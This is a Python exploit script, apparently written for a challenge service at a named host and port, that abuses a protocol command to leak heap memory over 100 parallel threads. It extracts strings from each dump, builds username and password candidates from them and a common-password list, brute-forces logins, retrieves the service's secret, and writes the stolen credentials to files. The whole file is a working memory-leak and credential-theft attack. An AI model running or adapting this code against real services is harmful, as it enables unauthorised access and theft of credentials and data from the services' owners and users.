#!/usr/bin/env python3
import socket
import struct
import sys
import time
import random
import string
import threading

"""
Threaded heap exploit with debug logging and relaxed filtering.

Usage:
    python3 exploit_threaded_debug.py reclass.ddns.net 7664
"""

HOST = sys.argv[1] if len(sys.argv) > 1 else "reclass.ddns.net"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 7664

NUM_THREADS = 100                # start with 20, you can raise later
MAX_LEAKS_PER_THREAD = 200

LEAK_SIZE = 0xfff0
MIN_STR_LEN = 3
MAX_STR_LEN = 32
MAX_PAIR_GAP = 96

BASE_SLEEP = 0.15
JITTER = 0.20

COMMON_PASSWORDS = [
    b"password",
    b"pass",
    b"1234",
    b"secret",
    b"test123",
]

FAILED_CREDENTIALS = set()
success_event = threading.Event()
result_lock = threading.Lock()
RESULT = {
    "dump": None,
    "user": None,
    "pass": None,
    "secret": None,
}
cache_lock = threading.Lock()


def recvn(sock, n, timeout=2.0):
    sock.settimeout(timeout)
    buf = b""
    while len(buf) < n:
        try:
            chunk = sock.recv(n - len(buf))
        except Exception:
            break
        if not chunk:
            break
        buf += chunk
    return buf


def make_conn():
    s = socket.socket()
    s.connect((HOST, PORT))
    greeting = recvn(s, 1, timeout=2.0)
    if len(greeting) != 1:
        raise RuntimeError(f"Did not get greeting byte, got {greeting!r}")
    return s


def set_user(sock, username):
    hdr = struct.pack("<BH", 0, len(username))
    sock.sendall(hdr + username)

    ack = recvn(sock, 1)
    if ack != b"\x06":
        raise RuntimeError(f"SET_USER ack mismatch: {ack!r}")

    echo = recvn(sock, len(username))
    if echo != username:
        raise RuntimeError(f"SET_USER echo mismatch: {echo!r} != {username!r}")


def try_pass(sock, password):
    hdr = struct.pack("<BH", 2, len(password))
    sock.sendall(hdr + password)
    ack = recvn(sock, 1)
    return ack == b"\x08"


def get_secret_with_creds(user, pw):
    try:
        s = make_conn()
    except Exception:
        return None

    try:
        set_user(s, user)
        if not try_pass(s, pw):
            s.close()
            return None

        hdr = struct.pack("<BH", 4, 0xffff)
        s.sendall(hdr)
        ack = recvn(s, 1)
        if ack != b"\x0a":
            s.close()
            return None

        secret = recvn(s, 65535)
        s.close()
        return secret
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return None


def extract_humanish_strings(data, min_len=3, max_len=32):
    """
    Relaxed filter:
      - allow letters, digits, underscore and dot
      - at least 2 unique characters
    """
    allowed = bytes(string.ascii_letters + string.digits + "_.", "ascii")
    results = []
    start = None

    for i, b in enumerate(data):
        if b in allowed:
            if start is None:
                start = i
        else:
            if start is not None:
                length = i - start
                if min_len <= length <= max_len:
                    s = data[start:i]
                    if len(set(s)) >= 2:
                        results.append((start, s))
                start = None

    if start is not None:
        length = len(data) - start
        if min_len <= length <= max_len:
            s = data[start:len(data)]
            if len(set(s)) >= 2:
                results.append((start, s))

    return results


def build_candidates_from_dump(data):
    strings = extract_humanish_strings(data, min_len=MIN_STR_LEN, max_len=MAX_STR_LEN)
    strings.sort(key=lambda x: x[0])

    candidates = []

    for i in range(len(strings) - 1):
        off1, s1 = strings[i]
        off2, s2 = strings[i + 1]
        gap = off2 - off1
        if 0 < gap <= MAX_PAIR_GAP:
            candidates.append((s1 + b"\x00", s2 + b"\x00"))

    for off, s1 in strings:
        for pw in COMMON_PASSWORDS:
            candidates.append((s1 + b"\x00", pw + b"\x00"))

    seen = set()
    unique = []
    for u, p in candidates:
        if (u, p) not in seen:
            seen.add((u, p))
            unique.append((u, p))

    return unique


def leak_once():
    try:
        s = make_conn()
    except Exception:
        return None

    try:
        attacker_user = b"AAAAAAAA" + b"\x00"
        set_user(s, attacker_user)

        hdr = struct.pack("<BH", 1, LEAK_SIZE)
        s.sendall(hdr)

        ack = recvn(s, 1)
        if ack != b"\x06":
            s.close()
            return None

        dump = recvn(s, LEAK_SIZE)
        s.close()
        return dump
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return None


class Worker(threading.Thread):
    def __init__(self, index):
        super().__init__()
        self.index = index

    def run(self):
        print(f"[T{self.index}] starting")
        for attempt in range(MAX_LEAKS_PER_THREAD):
            if success_event.is_set():
                break

            dump = leak_once()
            if not dump:
                if attempt % 20 == 0:
                    print(f"[T{self.index}] no dump at attempt {attempt}")
                time.sleep(BASE_SLEEP + random.random() * JITTER)
                continue

            if dump.count(b"\x00") == len(dump):
                if attempt % 20 == 0:
                    print(f"[T{self.index}] all zero dump at attempt {attempt}")
                time.sleep(BASE_SLEEP + random.random() * JITTER)
                continue

            candidates = build_candidates_from_dump(dump)

            with cache_lock:
                fresh = [(u, p) for (u, p) in candidates if (u, p) not in FAILED_CREDENTIALS]

            # Print summary for debugging, but not too spammy
            if attempt % 10 == 0 or fresh:
                print(f"[T{self.index}] attempt {attempt}: {len(candidates)} candidates, {len(fresh)} new")

            for (u, p) in fresh:
                if success_event.is_set():
                    break

                secret = get_secret_with_creds(u, p)
                if secret is not None:
                    with result_lock:
                        if not success_event.is_set():
                            RESULT["dump"] = dump
                            RESULT["user"] = u
                            RESULT["pass"] = p
                            RESULT["secret"] = secret
                            success_event.set()
                            print(f"[T{self.index}] SUCCESS with {u!r} {p!r}")
                    break
                else:
                    with cache_lock:
                        FAILED_CREDENTIALS.add((u, p))

            time.sleep(BASE_SLEEP + random.random() * JITTER)

        print(f"[T{self.index}] exiting")


def main():
    print(f"[*] Threaded heap exploit against {HOST}:{PORT}")
    print(f"[*] Threads: {NUM_THREADS}, leaks per thread: {MAX_LEAKS_PER_THREAD}")

    threads = [Worker(i) for i in range(NUM_THREADS)]
    for t in threads:
        t.start()

    success_event.wait()

    for t in threads:
        t.join()

    if RESULT["user"] is not None:
        print("[+] Exploit succeeded")
        print(f"[+] Username: {RESULT['user']!r}")
        print(f"[+] Password: {RESULT['pass']!r}")
        print("[+] Secret (first 256 bytes):")
        print(RESULT["secret"][:256])

        with open("success_dump.bin", "wb") as f:
            f.write(RESULT["dump"])
        with open("success_creds.txt", "w") as f:
            f.write(f"username: {RESULT['user']!r}\npassword: {RESULT['pass']!r}\n")

        print("[+] Saved success_dump.bin and success_creds.txt")
    else:
        print("[!] No valid credentials found")


if __name__ == "__main__":
    main()
